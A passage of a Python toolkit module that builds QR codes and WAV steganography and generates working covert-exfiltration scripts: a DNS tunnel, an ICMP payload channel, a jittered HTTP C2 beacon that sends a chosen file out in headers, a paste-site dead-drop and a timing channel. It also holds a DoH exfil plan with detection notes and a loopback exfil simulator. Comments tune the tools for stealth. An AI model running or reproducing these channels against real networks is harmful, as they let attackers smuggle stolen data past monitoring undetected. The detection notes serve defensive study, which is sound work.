        for i in range(7, -1, -1):
            bits.append((b >> i) & 1)
    i = 0
    right = size - 1
    while right >= 1:
        if right == 6:
            right = 5
        for vert in range(size):
            for j in range(2):
                x = right - j
                upward = ((right + 1) & 2) == 0
                y = size - 1 - vert if upward else vert
                if not isfunc[y][x] and i < len(bits):
                    modules[y][x] = bool(bits[i])
                    i += 1
        right -= 2

    # choose best mask by penalty score
    best_mask, best_pen, best_mod = 0, None, None
    for m in range(8):
        cand = [row[:] for row in modules]
        for y in range(size):
            for x in range(size):
                if not isfunc[y][x] and _qr_mask_bit(m, x, y):
                    cand[y][x] = not cand[y][x]
        p = _qr_penalty(cand, size)
        if best_pen is None or p < best_pen:
            best_pen, best_mask, best_mod = p, m, cand
    modules = best_mod
    # redraw format info with the winning mask
    fd = (1 << 3) | best_mask
    rem = fd
    for _ in range(10):
        rem = (rem << 1) ^ ((rem >> 9) * 0x537)
    bits = ((fd << 10) | rem) ^ 0x5412

    def putf(x, y, bit):
        modules[y][x] = bool(bit)

    for i in range(6):
        putf(8, i, (bits >> i) & 1)
    putf(8, 7, (bits >> 6) & 1)
    putf(8, 8, (bits >> 7) & 1)
    putf(7, 8, (bits >> 8) & 1)
    for i in range(9, 15):
        putf(14 - i, 8, (bits >> i) & 1)
    for i in range(8):
        putf(size - 1 - i, 8, (bits >> i) & 1)
    for i in range(8, 15):
        putf(8, size - 15 + i, (bits >> i) & 1)
    putf(8, size - 8, True)
    return version, size, modules, best_mask, best_pen


def _qr_write_svg(modules, size, path, scale=8, border=4):
    dim = (size + border * 2) * scale
    rects = []
    for y in range(size):
        for x in range(size):
            if modules[y][x]:
                rects.append('<rect x="%d" y="%d" width="%d" height="%d"/>' % (
                    (x + border) * scale, (y + border) * scale, scale, scale))
    svg = ('<svg xmlns="http://www.w3.org/2000/svg" width="%d" height="%d" '
           'viewBox="0 0 %d %d"><rect width="100%%" height="100%%" fill="#ffffff"/>'
           '<g fill="#000000">%s</g></svg>') % (dim, dim, dim, dim, "".join(rects))
    with open(path, "w") as f:
        f.write(svg)


def _png_chunk(tag, payload):
    import zlib
    c = struct.pack(">I", len(payload)) + tag + payload
    return c + struct.pack(">I", zlib.crc32(tag + payload) & 0xFFFFFFFF)


def _qr_write_png(modules, size, path, scale=8, border=4):
    import zlib
    dim = size + border * 2
    rows = []
    for gy in range(dim):
        my = gy - border
        row = bytearray([0])  # filter type 0
        for gx in range(dim):
            mx = gx - border
            dark = 0 <= mx < size and 0 <= my < size and modules[my][mx]
            row.append(0 if dark else 255)
        rows.append(bytes(row))
    if scale > 1:
        up = []
        for gy in range(dim):
            row = bytearray([0])
            src = rows[gy][1:]
            for px in src:
                row.extend([px] * scale)
            for _ in range(scale):
                up.append(bytes(row))
        rows = up
        dim *= scale
    scan = b"".join(rows)
    ihdr = struct.pack(">IIBBBBB", dim, dim, 8, 0, 0, 0, 0)  # 8-bit grayscale
    png = (b"\x89PNG\r\n\x1a\n" + _png_chunk(b"IHDR", ihdr) +
           _png_chunk(b"IDAT", zlib.compress(scan, 9)) + _png_chunk(b"IEND", b""))
    with open(path, "wb") as f:
        f.write(png)


def nm20_data_qr_encode(args):
    """REAL minimal QR generator (pure python, byte mode, EC level L, v1-9) -> SVG+PNG."""
    r = _base("qr_encode")
    text = args.get("text")
    path = args.get("path")
    data_hex = args.get("data_hex")
    if text is not None:
        data = text.encode("utf-8")
    elif data_hex is not None:
        try:
            data = bytes.fromhex(data_hex)
        except ValueError:
            r["error"] = "data_hex is not valid hex"
            return r
    elif path and os.path.isfile(path):
        with open(path, "rb") as f:
            data = f.read()
    else:
        r["error"] = "provide text=, data_hex= or path="
        return r
    if not data:
        r["error"] = "empty payload"
        return r
    if len(data) > 230:
        r["error"] = "payload %d bytes exceeds v9-L byte-mode capacity (230)" % len(data)
        return r
    try:
        version, size, modules, mask, penalty = _qr_build_matrix(data)
    except ValueError as e:
        r["error"] = str(e)
        return r
    svg_path = _resolve_out(args, "nm20_qr.svg")
    if not svg_path.endswith(".svg"):
        svg_path += ".svg"
    png_path = svg_path[:-4] + ".png"
    try:
        _qr_write_svg(modules, size, svg_path)
        _qr_write_png(modules, size, png_path)
    except OSError as e:
        r["error"] = str(e)
        return r
    dark = sum(1 for row in modules for v in row if v)
    r["ok"] = True
    r["payload_bytes"] = len(data)
    r["payload_sha256"] = hashlib.sha256(data).hexdigest()
    r["version"] = version
    r["size_modules"] = size
    r["ec_level"] = "L"
    r["mask"] = mask
    r["penalty_score"] = penalty
    r["dark_modules"] = dark
    r["svg"] = svg_path
    r["png"] = png_path
    r["note"] = "standards-compliant QR (byte mode, ECL=L); decodable by any QR reader"
    if args.get("matrix"):
        r["matrix"] = ["".join("#" if v else "." for v in row) for row in modules]
    return r


# --------------------------------------------------------------------------
# WAV LSB steganography (stdlib wave)
# --------------------------------------------------------------------------

def nm20_data_stego_wav(args):
    """REAL WAV-LSB stego: generates a sine carrier WAV, embeds/extracts bytes in sample LSBs."""
    r = _base("stego_wav")
    mode = args.get("mode", "embed")
    rate = int(args.get("rate", 8000))
    freq = float(args.get("freq", 440.0))
    amp = int(args.get("amplitude", 12000))
    magic = b"NM20"

    def bits_of(data):
        for b in data:
            for i in range(7, -1, -1):
                yield (b >> i) & 1

    if mode == "embed":
        text = args.get("text")
        path = args.get("path")
        if text is not None:
            payload = text.encode("utf-8")
            src = "<inline text>"
        elif path and os.path.isfile(path):
            with open(path, "rb") as f:
                payload = f.read()
            src = path
        else:
            r["error"] = "provide text= or path="
            return r
        stream = magic + struct.pack("<I", len(payload)) + payload
        nbits = len(stream) * 8
        nsamp = nbits + rate // 10  # 100ms tail margin
        if nsamp > rate * 60:
            r["error"] = "payload too large (would exceed 60s carrier)"
            return r
        out = _resolve_out(args, "nm20_stego.wav")
        bit_iter = bits_of(stream)
        frames = bytearray()
        for i in range(nsamp):
            t = i / float(rate)
            s = int(amp * math.sin(2.0 * math.pi * freq * t))
            u = s & 0xFFFF
            bit = next(bit_iter, 0)
            u = (u & ~1) | bit
            frames += struct.pack("<H", u)
        try:
            with wave.open(out, "wb") as w:
                w.setnchannels(1)
                w.setsampwidth(2)
                w.setframerate(rate)
                w.writeframes(bytes(frames))
        except (OSError, wave.Error) as e:
            r["error"] = str(e)
            return r
        r["ok"] = True
        r["source"] = src
        r["output"] = out
        r["payload_bytes"] = len(payload)
        r["payload_sha256"] = hashlib.sha256(payload).hexdigest()
        r["carrier"] = {"rate": rate, "freq_hz": freq, "amplitude": amp,
                        "seconds": round(nsamp / float(rate), 3), "samples": nsamp}
        r["capacity_bytes"] = nsamp // 8 - 8
        r["note"] = "1 LSB per 16-bit sample; header NM20+len; extract with mode=extract"
    elif mode == "extract":
        path = args.get("path")
        if not path or not os.path.isfile(path):
            r["error"] = "missing or unreadable arg: path (wav)"
            return r
        try:
            with wave.open(path, "rb") as w:
                n = w.getnframes()
                frames = w.readframes(n)
                sw = w.getsampwidth()
                rate = w.getframerate()
        except (OSError, wave.Error) as e:
            r["error"] = "wave read: %s" % e
            return r
        if sw != 2:
            r["error"] = "expected 16-bit samples, got %d-byte" % sw
            return r
        samples = struct.unpack("<%dH" % (len(frames) // 2), frames)
        bitstream = [s & 1 for s in samples]

        def take(nbits, off):
            val = 0
            for i in range(nbits):
                val = (val << 1) | bitstream[off + i]
            return val

        if len(bitstream) < 64:
            r["error"] = "wav too short for stego header"
            return r
        hdr = bytes(take(8, i * 8) for i in range(4))
        if hdr != magic:
            r["error"] = "no NM20 stego header found (first 4 bytes: %r)" % hdr
            return r
        plen = struct.unpack("<I", bytes(take(8, 32 + i * 8) for i in range(4)))[0]
        if plen < 0 or (64 + plen * 8) > len(bitstream):
            r["error"] = "declared length %d exceeds carrier capacity" % plen
            return r
        payload = bytes(take(8, 64 + i * 8) for i in range(plen))
        out = _resolve_out(args, "nm20_stego_extracted.bin")
        with open(out, "wb") as f:
            f.write(payload)
        r["ok"] = True
        r["input"] = path
        r["output"] = out
        r["rate"] = rate
        r["payload_bytes"] = plen
        r["payload_sha256"] = hashlib.sha256(payload).hexdigest()
        r["preview_utf8"] = payload[:64].decode("utf-8", "replace")
        expect = args.get("expect_sha256")
        if expect:
            r["matches_expected"] = r["payload_sha256"] == expect
    else:
        r["error"] = "mode must be embed|extract"
    return r


# --------------------------------------------------------------------------
# Channel artifact generators (real source, artifact-only, armed:false)
# --------------------------------------------------------------------------

_DNS_CLIENT_SRC = r'''#!/usr/bin/env python3
"""nm20 DNS-tunnel client — generated by nm20.data.dns_channel_gen.
Chunks a file into base32 subdomain labels of a controlled zone and emits
real DNS TXT queries to the tunnel server. Usage:
  python3 nm20_dns_client.py <file> <server_ip> [zone] [port]
"""
import base64, os, struct, socket, sys, time

ZONE = "t.example.com"

def qname_wire(name):
    return b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\x00"

def send_chunk(sock, idx, chunk, server, port, zone):
    enc = base64.b32encode(chunk).decode().rstrip("=").lower()
    labels = [enc[i:i + 60] for i in range(0, len(enc), 60)] or ["0"]
    name = ".".join(labels) + "." + zone
    pkt = struct.pack(">HHHHHH", idx & 0xFFFF, 0x0100, 1, 0, 0, 0)
    pkt += qname_wire(name) + struct.pack(">HH", 16, 1)  # TXT, IN
    sock.sendto(pkt, (server, port))

def main():
    path = sys.argv[1]
    server = sys.argv[2]
    zone = sys.argv[3] if len(sys.argv) > 3 else ZONE
    port = int(sys.argv[4]) if len(sys.argv) > 4 else 53
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    with open(path, "rb") as f:
        data = f.read()
    chunk = 90  # keep qname < 253 chars
    total = (len(data) + chunk - 1) // chunk
    send_chunk(sock, 0xFFFF, ("LEN:%d" % len(data)).encode(), server, port, zone)
    for i in range(total):
        send_chunk(sock, i, data[i * chunk:(i + 1) * chunk], server, port, zone)
        time.sleep(0.02)  # shape rate; raise for stealth
    send_chunk(sock, 0xFFFE, b"END", server, port, zone)
    print("sent %d chunks (%d bytes) to %s:%d zone=%s" % (total, len(data), server, port, zone))

if __name__ == "__main__":
    main()
'''

_DNS_SERVER_SRC = r'''#!/usr/bin/env python3
"""nm20 DNS-tunnel server — generated by nm20.data.dns_channel_gen.
Binds UDP 53 (needs root/CAP_NET_BIND_SERVICE; use port 5353 to test),
parses real DNS queries, reassembles base32 label chunks into the file.
Usage: python3 nm20_dns_server.py [outfile] [port] [zone]
"""
import base64, socket, struct, sys

def parse_qname(pkt, off=12):
    labels = []
    while off < len(pkt):
        ln = pkt[off]
        if ln == 0:
            return labels, off + 1
        if ln & 0xC0:
            return labels, off + 2
        labels.append(pkt[off + 1:off + 1 + ln].decode("ascii", "replace"))
        off += 1 + ln
    return labels, off

def b32_nopad(s):
    s = s.upper()
    s += "=" * ((8 - len(s) % 8) % 8)
    return base64.b32decode(s)

def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "nm20_dns_recv.bin"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 53
    zone = sys.argv[3] if len(sys.argv) > 3 else "t.example.com"
    zl = zone.split(".")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", port))
    print("listening on 0.0.0.0:%d for zone %s -> %s" % (port, zone, out))
    chunks = {}
    declared = None
    while True:
        pkt, addr = sock.recvfrom(4096)
        if len(pkt) < 12:
            continue
        qid, flags, qd = struct.unpack(">HHH", pkt[:6])
        labels, end = parse_qname(pkt)
        data_labels = labels[:len(labels) - len(zl)]
        try:
            body = b32_nopad("".join(data_labels)) if data_labels else b""
        except Exception:
            body = b""
        if qid == 0xFFFF and body.startswith(b"LEN:"):
            declared = int(body[4:])
        elif qid == 0xFFFE:
            buf = b"".join(chunks.get(i, b"") for i in sorted(chunks))
            with open(out, "wb") as f:
                f.write(buf[:declared] if declared else buf)
            print("END: wrote %d bytes to %s" % (min(len(buf), declared or len(buf)), out))
            chunks.clear()
        elif data_labels:
            chunks[qid] = body
        # minimal valid response: copy id, QR+RA flags, echo question, no answers
        resp = struct.pack(">HHHHHH", qid, 0x8180, 1, 0, 0, 0) + pkt[12:end]
        sock.sendto(resp, addr)

if __name__ == "__main__":
    main()
'''

_ICMP_CHAN_SRC = r'''#!/usr/bin/env python3
"""nm20 ICMP-payload channel — generated by nm20.data.icmp_channel_gen.
REAL raw-socket ICMP echo carrier; requires root on both ends.
  send: python3 nm20_icmp_chan.py send <file> <dst_ip>
  recv: python3 nm20_icmp_chan.py recv <outfile>
"""
import os, socket, struct, sys, time

def csum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF

def send(path, dst):
    ident = os.getpid() & 0xFFFF
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    with open(path, "rb") as f:
        data = f.read()
    chunk = 48  # payload bytes per echo; small = quiet
    seq = 0
    hdr_payload = b"LEN:" + str(len(data)).encode()
    pieces = [hdr_payload] + [data[i:i + chunk] for i in range(0, len(data), chunk)] + [b"END"]
    for piece in pieces:
        hdr = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
        pkt = struct.pack("!BBHHH", 8, 0, csum(hdr + piece), ident, seq) + piece
        s.sendto(pkt, (dst, 0))
        seq += 1
        time.sleep(0.1)  # shape rate for stealth
    print("sent %d echo payloads (%d bytes) to %s" % (len(pieces), len(data), dst))

def recv(out):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    print("sniffing ICMP (root) -> %s ; Ctrl-C after END" % out)
    buf = {}
    declared = None
    while True:
        pkt, addr = s.recvfrom(2048)
        ihl = (pkt[0] & 0x0F) * 4
        if len(pkt) < ihl + 8:
            continue
        typ, code, _cs, ident, seq = struct.unpack("!BBHHH", pkt[ihl:ihl + 8])
        if typ != 8:
            continue
        payload = pkt[ihl + 8:]
        if payload.startswith(b"LEN:"):
            declared = int(payload[4:])
        elif payload == b"END":
            body = b"".join(buf[i] for i in sorted(buf))
            with open(out, "wb") as f:
                f.write(body[:declared] if declared else body)
            print("END: wrote %s" % out)
            buf.clear()
        elif payload:
            buf[seq - 1] = payload

if __name__ == "__main__":
    if len(sys.argv) >= 4 and sys.argv[1] == "send":
        send(sys.argv[2], sys.argv[3])
    elif len(sys.argv) >= 3 and sys.argv[1] == "recv":
        recv(sys.argv[2])
    else:
        print(__doc__)
'''

_HTTP_BEACON_SRC = r'''#!/usr/bin/env python3
"""nm20 jittered HTTP beacon — generated by nm20.data.http_beacon_gen.
Real urllib beacon loop with jittered interval and base64 task/data slots.
Usage: C2=http://host:port python3 nm20_http_beacon.py [interval_s] [jitter_0..1]
Set NM20_EXFIL_FILE to a path to drip that file out base64'd in a header.
"""
import base64, os, random, sys, time, urllib.request, urllib.error

C2 = os.environ.get("C2", "http://127.0.0.1:8080")
INTERVAL = float(sys.argv[1]) if len(sys.argv) > 1 else 30.0
JITTER = min(max(float(sys.argv[2]) if len(sys.argv) > 2 else 0.3, 0.0), 0.9)
AGENT = "Mozilla/5.0 (X11; Linux x86_64) nm20/1.0"
CHUNK = 512

def nap():
    time.sleep(INTERVAL * (1.0 + random.uniform(-JITTER, JITTER)))

def main():
    fid = os.environ.get("NM20_EXFIL_FILE")
    queue = []
    if fid and os.path.isfile(fid):
        with open(fid, "rb") as f:
            data = f.read()
        queue = [data[i:i + CHUNK] for i in range(0, len(data), CHUNK)]
    ident = "%08x" % random.getrandbits(32)
    n = 0
    while True:
        hdrs = {"User-Agent": AGENT, "X-Session": ident}
        if queue:
            hdrs["X-Data"] = base64.b64encode(queue.pop(0)).decode()
            hdrs["X-Seq"] = str(n)
        req = urllib.request.Request(C2 + "/sync", headers=hdrs)
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read(65536)
            if body:
                print("task bytes received: %d" % len(body))
        except (urllib.error.URLError, OSError) as e:
            print("c2 unreachable: %s" % e)
        n += 1
        if fid and not queue:
            print("exfil complete after %d beacons" % n)
            return
        nap()

if __name__ == "__main__":
    main()
'''

_PASTE_CHAN_SRC = r'''#!/usr/bin/env python3
"""nm20 paste dead-drop channel — generated by nm20.data.paste_channel_gen.
Real paste.rs-style protocol: PUT / returns a URL; GET <url> reads it back.
  post: python3 nm20_paste_chan.py post <base_url> <file>
  poll: python3 nm20_paste_chan.py poll <base_url> <paste_url> [out]
Works against any service with PUT->URL semantics (paste.rs, self-hosted).
"""
import base64, sys, urllib.request, urllib.error

def req(method, url, data=None):
    r = urllib.request.Request(url, data=data, method=method,
                               headers={"User-Agent": "curl/8.0"})
    with urllib.request.urlopen(r, timeout=15) as resp:
        return resp.read()

def post(base, path):
    with open(path, "rb") as f:
        blob = base64.b64encode(f.read())
    url = req("PUT", base.rstrip("/") + "/", blob).decode().strip()
    print(url)  # this URL is the dead-drop handle; move it over any channel

def poll(base, url, out):
    blob = req("GET", url)
    data = base64.b64decode(blob)
    with open(out, "wb") as f:
        f.write(data)
    print("wrote %d bytes to %s" % (len(data), out))

if __name__ == "__main__":
    try:
        if sys.argv[1] == "post":
            post(sys.argv[2], sys.argv[3])
        elif sys.argv[1] == "poll":
            poll(sys.argv[2], sys.argv[3], sys.argv[4] if len(sys.argv) > 4 else "nm20_paste_out.bin")
        else:
            print(__doc__)
    except (urllib.error.URLError, OSError) as e:
        print("error: %s" % e)
'''

_TIMING_CHAN_SRC = r'''#!/usr/bin/env python3
"""nm20 covert timing channel — generated by nm20.data.timing_channel_gen.
Encodes bits in inter-packet delay over a TCP stream (short=0, long=1).
  receiver: python3 nm20_timing.py recv [port] [out]
  sender:   python3 nm20_timing.py send <host> [port] [file]
Threshold auto-set at midpoint; 0xAA preamble byte for sync.
"""
import os, socket, struct, sys, time

SHORT, LONG = 0.05, 0.15
PREAMBLE = 0xAA

def send(host, port, data):
    s = socket.create_connection((host, port), timeout=10)
    stream = bytes([PREAMBLE]) + struct.pack("<I", len(data)) + data + b"\x00"
    bits = [(b >> i) & 1 for b in stream for i in range(7, -1, -1)]
    for b in bits:
        s.sendall(b"\x01")          # one marker byte; meaning is in the GAP
        time.sleep(LONG if b else SHORT)
    s.close()

def recv(port, out):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port)); srv.listen(1)
    print("timing receiver on %d (short=%.2fs long=%.2fs)" % (port, SHORT, LONG))
    c, addr = srv.accept()
    mid = (SHORT + LONG) / 2.0
    gaps = []
    last = time.time()
    while True:
        if not c.recv(1):
            break
        now = time.time()
        gaps.append(1 if (now - last) > mid else 0)
        last = now
    gaps = gaps[1:]  # first gap (accept->first byte) is connect noise, not data
    nbytes = len(gaps) // 8
    raw = bytes(sum(gaps[i * 8 + j] << (7 - j) for j in range(8)) for i in range(nbytes))
    if raw[:1] != bytes([PREAMBLE]):
        print("sync lost; dump: %r" % raw[:16]); return
    ln = struct.unpack("<I", raw[1:5])[0]
    with open(out, "wb") as f:
        f.write(raw[5:5 + ln])
    print("decoded %d bytes -> %s" % (ln, out))

if __name__ == "__main__":
    if sys.argv[1] == "send":
        payload = open(sys.argv[4], "rb").read() if len(sys.argv) > 4 else b"nm20-timing-demo"
        send(sys.argv[2], int(sys.argv[3]) if len(sys.argv) > 3 else 9999, payload)
    elif sys.argv[1] == "recv":
        recv(int(sys.argv[2]) if len(sys.argv) > 2 else 9999,
             sys.argv[3] if len(sys.argv) > 3 else "nm20_timing_out.bin")
    else:
        print(__doc__)
'''


def nm20_data_dns_channel_gen(args):
    """Generate REAL DNS-tunnel client+server python sources into /tmp (artifact only)."""
    r = _base("dns_channel_gen")
    c = _write_artifact("nm20_dns_client.py", _DNS_CLIENT_SRC, 0o755)
    s = _write_artifact("nm20_dns_server.py", _DNS_SERVER_SRC, 0o755)
    r["ok"] = True
    r["artifacts"] = [c, s]
    r["bytes"] = {c: os.path.getsize(c), s: os.path.getsize(s)}
    r["usage"] = {"server": "python3 %s out.bin 5353 t.example.com" % s,
                  "client": "python3 %s file.bin 127.0.0.1 t.example.com 5353" % c}
    r["note"] = "base32-in-subdomain TXT queries; port 53 needs root, use 5353 to test"
    r["would_do"] = "client chunks file -> b32 labels -> real DNS queries; server reassembles"
    return r


def nm20_data_icmp_channel_gen(args):
    """Generate a REAL raw-socket ICMP-payload channel script into /tmp (needs root)."""
    r = _base("icmp_channel_gen")
    p = _write_artifact("nm20_icmp_chan.py", _ICMP_CHAN_SRC, 0o755)
    r["ok"] = True
    r["artifact"] = p
    r["bytes"] = os.path.getsize(p)
    r["usage"] = {"send": "python3 %s send <file> <dst_ip>" % p,
                  "recv": "python3 %s recv <outfile>" % p}
    r["requires"] = "root/CAP_NET_RAW on both ends (SOCK_RAW IPPROTO_ICMP)"
    r["would_do"] = "echo-request payload carriage, 48B/echo default, seq-reassembled"
    return r


def nm20_data_http_beacon_gen(args):
    """Generate a REAL jittered HTTP beacon python source into /tmp (artifact only)."""
    r = _base("http_beacon_gen")
    p = _write_artifact("nm20_http_beacon.py", _HTTP_BEACON_SRC, 0o755)
    r["ok"] = True
    r["artifact"] = p
    r["bytes"] = os.path.getsize(p)
    r["armed"] = False
    r["usage"] = "C2=http://127.0.0.1:8080 NM20_EXFIL_FILE=secret.bin python3 %s 30 0.3" % p
    r["would_do"] = "beacon loop with jittered sleep; optional file drip via base64 X-Data header"
    return r


_DOH_PLAN = """# nm20 DoH exfil channel plan (generated by nm20.data.doh_channel_plan)

## Design
- Transport: HTTPS GET to a DoH resolver endpoint: `GET /dns-query?dns=<b64url(dns_wire)>`
  or POST with `application/dns-message` body. Traffic is indistinguishable from
  ordinary DoH at L4 (TCP/443, TLS) -- inspection requires TLS break or endpoint rep.
- Encoding: same base32-label scheme as nm20.data.dns_channel_gen; the DNS wire
  message rides inside the DoH envelope, adding ~2KB of TLS/HTTP overhead per query.
- Resolver choice: run your OWN DoH front (nginx + the nm20_dns_server on 127.0.0.1:53).
  Using public resolvers (Cloudflare 1.1.1.1, Google 8.8.8.8) makes the channel
  blend with legit volume but logs everything at the provider.

## Capacity model
- ~90 raw bytes per query (qname limit), 1 query per TLS keep-alive RTT.
- At 5 q/s sustained with 2s keep-alive reuse: ~3.6 kbps effective; bursty files
  should be pre-compressed (nm20.data.gzip_pack) and XOR-staged (xor_stream).

## Detection surface (blue-team view)
- Beaconing regularity in TLS flows to a single resolver IP/domain (mitigate: jitter).
- Query-name entropy and length anomalies vs. browser DoH baseline.
- Volume: total DoH bytes per host per day vs. baseline.
- JA3/JA4 client fingerprints of python-urllib vs. browsers (mitigate: real TLS stack).
- Long-tail: resolver domains not seen elsewhere in the org.

## Countermeasures
- Alert on >N TXT-type DoH queries/hour per host; label-length histograms;
  per-resolver byte budgets; egress allow-listing of known DoH endpoints.
"""


def nm20_data_doh_channel_plan(args):
    """Research artifact: DNS-over-HTTPS exfil channel plan + detection notes."""
    r = _base("doh_channel_plan")
    p = _write_artifact("nm20_doh_plan.md", _DOH_PLAN)
    r["ok"] = True
    r["artifact"] = p
    r["bytes"] = os.path.getsize(p)
    r["summary"] = {
        "transport": "HTTPS GET /dns-query?dns=<b64url> or POST application/dns-message",
        "encoding": "base32 labels inside DNS wire message (see dns_channel_gen)",
        "capacity_bps_est": 3600,
        "key_detections": ["TLS flow regularity", "qname entropy", "volume baseline",
                            "JA3/JA4 fingerprint", "resolver allow-list"],
    }
    return r


def nm20_data_paste_channel_gen(args):
    """Generate a REAL paste.rs-style dead-drop poster/poller script into /tmp."""
    r = _base("paste_channel_gen")
    p = _write_artifact("nm20_paste_chan.py", _PASTE_CHAN_SRC, 0o755)
    r["ok"] = True
    r["artifact"] = p
    r["bytes"] = os.path.getsize(p)
    r["usage"] = {"post": "python3 %s post https://paste.rs file.bin" % p,
                  "poll": "python3 %s poll https://paste.rs <url> out.bin" % p}
    r["note"] = "PUT->URL semantics (paste.rs or self-hosted); base64 wrap; URL is the dead-drop handle"
    return r


def nm20_data_timing_channel_gen(args):
    """Generate a REAL covert timing-channel sender/receiver script into /tmp."""
    r = _base("timing_channel_gen")
    p = _write_artifact("nm20_timing.py", _TIMING_CHAN_SRC, 0o755)
    r["ok"] = True
    r["artifact"] = p
    r["bytes"] = os.path.getsize(p)
    r["usage"] = {"recv": "python3 %s recv 9999 out.bin" % p,
                  "send": "python3 %s send 127.0.0.1 9999 file.bin" % p}
    r["note"] = "bit=1 -> 150ms gap, bit=0 -> 50ms gap; ~7-20 bps; 0xAA preamble sync"
    return r


# --------------------------------------------------------------------------
# Live local simulations + analysis
# --------------------------------------------------------------------------

def nm20_data_exfil_sim(args):
    """REAL loopback exfil sim: TCP 127.0.0.1 transfer with timing/jitter profile."""
    r = _base("exfil_sim")
    path = args.get("path")
    if path and os.path.isfile(path):
        with open(path, "rb") as f:
            payload = f.read()
        src = path
    else:
        nbytes = min(int(args.get("bytes", 64 * 1024)), 4 * 1024 * 1024)
        seed = str(args.get("seed", "nm20")).encode()
        blocks = []
        done = 0
        while done < nbytes:
            b = hashlib.sha256(seed + struct.pack("<I", len(blocks))).digest()
            blocks.append(b)
            done += len(b)
        payload = (b"".join(blocks))[:nbytes]
        src = "<synthetic sha256 stream>"
    chunk = max(64, int(args.get("chunk", 1400)))
    interval = max(0.0, float(args.get("interval", 0.02)))
    jitter = min(max(float(args.get("jitter", 0.5)), 0.0), 0.95)
    if len(payload) / chunk * interval * (1 + jitter) > 25.0:
        r["error"] = "profile would exceed 25s; raise chunk/lower interval"
        r["estimated_s"] = round(len(payload) / chunk * interval, 2)
        return r
    recv_path = args.get("recv_path") or os.path.join(TMPDIR, "nm20_exfil_sim_recv.bin")
    stats = {"received": 0, "error": None}
    ready = threading.Event()

    def receiver():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("127.0.0.1", 0))
            srv.listen(1)
            stats["port"] = srv.getsockname()[1]
            ready.set()
            srv.settimeout(20)
            conn, _ = srv.accept()
            with open(recv_path, "wb") as f:
                while True:
                    b = conn.recv(65536)
                    if not b:
                        break
                    f.write(b)
                    stats["received"] += len(b)
            conn.close()
        except OSError as e:
            stats["error"] = str(e)
            ready.set()
        finally:
            srv.close()

    t = threading.Thread(target=receiver, daemon=True)
    t.start()
    ready.wait(5)
    if stats["error"] or "port" not in stats:
        r["error"] = "receiver setup: %s" % (stats["error"] or "no port")
        return r
    deltas = []
    try:
        s = socket.create_connection(("127.0.0.1", stats["port"]), timeout=10)
        t0 = time.time()
        last = t0
        for i in range(0, len(payload), chunk):
            s.sendall(payload[i:i + chunk])
            now = time.time()
            if i:
                deltas.append(now - last)
            last = now
            if interval:
                time.sleep(interval * (1.0 + random.uniform(-jitter, jitter)))
        s.shutdown(socket.SHUT_WR)
        wall = time.time() - t0
        s.close()
        t.join(timeout=10)
    except OSError as e:
        r["error"] = "transfer: %s" % e
        return r
    ok_hash = (_sha256_file(recv_path) == hashlib.sha256(payload).hexdigest()
               and stats["received"] == len(payload))
    r["ok"] = ok_hash
    r["source"] = src
    r["recv_path"] = recv_path
    r["payload_bytes"] = len(payload)
    r["received_bytes"] = stats["received"]
    r["hash_match"] = ok_hash
    r["wall_time_s"] = round(wall, 3)
    r["effective_bps"] = round(len(payload) * 8 / wall, 1) if wall > 0 else None
    r["profile"] = {"chunk": chunk, "interval_s": interval, "jitter": jitter,
                    "sends": len(deltas) + 1}
    if deltas:
        r["timing"] = {"mean_gap_s": round(sum(deltas) / len(deltas), 5),
                       "min_gap_s": round(min(deltas), 5),
                       "max_gap_s": round(max(deltas), 5)}
    return r


class _TokenBucket(object):
    def __init__(self, rate, capacity):
        self.rate = float(rate)
        self.capacity = float(capacity)
        self.tokens = float(capacity)
        self.ts = time.monotonic()

    def allow(self):
        now = time.monotonic()
        self.tokens = min(self.capacity, self.tokens + (now - self.ts) * self.rate)
        self.ts = now
        if self.tokens >= 1.0:
            self.tokens -= 1.0
            return True
        return False


def nm20_data_rate_limiter(args):
    """REAL token-bucket demo: timed burst against a live bucket; reports shaping."""
    r = _base("rate_limiter")
    rate = float(args.get("rate", 100.0))
    capacity = float(args.get("capacity", rate))
    duration = min(float(args.get("duration", 2.0)), 10.0)
    offered_per_s = float(args.get("offered", 0))  # 0 = unlimited (greedy)
    bucket = _TokenBucket(rate, capacity)
    allowed = denied = 0
    timeline = []
    t0 = time.monotonic()
    next_offer = t0
    while True:
        now = time.monotonic()
        if now - t0 >= duration:
            break
        if offered_per_s > 0:
            if now < next_offer:
                time.sleep(min(next_offer - now, 0.01))
                continue
            next_offer = max(next_offer + 1.0 / offered_per_s, now)
        if bucket.allow():
            allowed += 1
            if len(timeline) < 200:
                timeline.append(round(now - t0, 4))
        else:
            denied += 1
            if offered_per_s <= 0:
                time.sleep(0.0005)
    wall = time.monotonic() - t0
    r["ok"] = True
    r["bucket"] = {"rate_per_s": rate, "capacity": capacity}
    r["duration_s"] = round(wall, 3)
    r["allowed"] = allowed
    r["denied"] = denied
    r["achieved_per_s"] = round(allowed / wall, 2) if wall > 0 else 0.0
    r["offered_per_s"] = offered_per_s or "greedy"
    # token bucket bound: at most capacity + rate*tokens_elapsed may pass
    r["bucket_bound_max"] = round(capacity + rate * wall, 1)
    r["within_limit"] = allowed <= (capacity + rate * wall) * 1.02
    r["first_allows_ts"] = timeline[:40]
    return r


_CHANNEL_MODEL = [
    # name, payload_bytes_per_unit, units_per_s, overhead frac,
    # detection features: (uncommon_proto, high_entropy, regularity, volume_anomaly) 0-10
    ("dns_txt_b32",    90,     5.0,  0.15, (8, 7, 6, 5)),
